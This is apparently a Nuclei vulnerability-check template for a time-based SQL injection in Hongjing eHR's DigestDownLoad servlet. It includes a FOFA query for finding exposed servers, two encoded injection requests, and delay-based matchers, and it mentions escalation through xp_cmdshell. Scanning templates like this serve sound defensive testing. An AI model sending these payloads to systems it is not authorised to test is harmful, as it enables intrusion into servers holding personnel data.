id: hjeHR-DigestDownLoad-sql-time

info:
  name: 宏景eHR DigestDownLoad SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: app="HJSOFT-HCM"
    宏景eHR DigestDownLoad 接口处存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
  reference:
    - https://mp.weixin.qq.com/s/U9DM7qvagUS5M3v_vmlPiw
  tags: sql injection

http:
  - raw:
      - |
        GET /servlet/DigestDownLoad?type=original&id=i8hoHAILh4YkvJtIAayRbgJzqZUPAATTP2HJBPAATTPfhxbhGm4jOsPAATTP2HJFPAATTPyM8PAATTP3HJDPAATTP HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
      - |
        GET /servlet/DigestDownLoad?type=original&id=FAAor8PAATTP2HJBPAATTPponI4yXkPAATTP2HJBPAATTPcVlfbP56PAATTP2HJFPAATTPPAATTP2HJFPAATTPkfU7lSDv5nFnpafrEPAATTP3HJDPAATTP HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=3 && duration_1<=4'  
          - 'duration_2>=5 && duration_2<=6'
        condition: and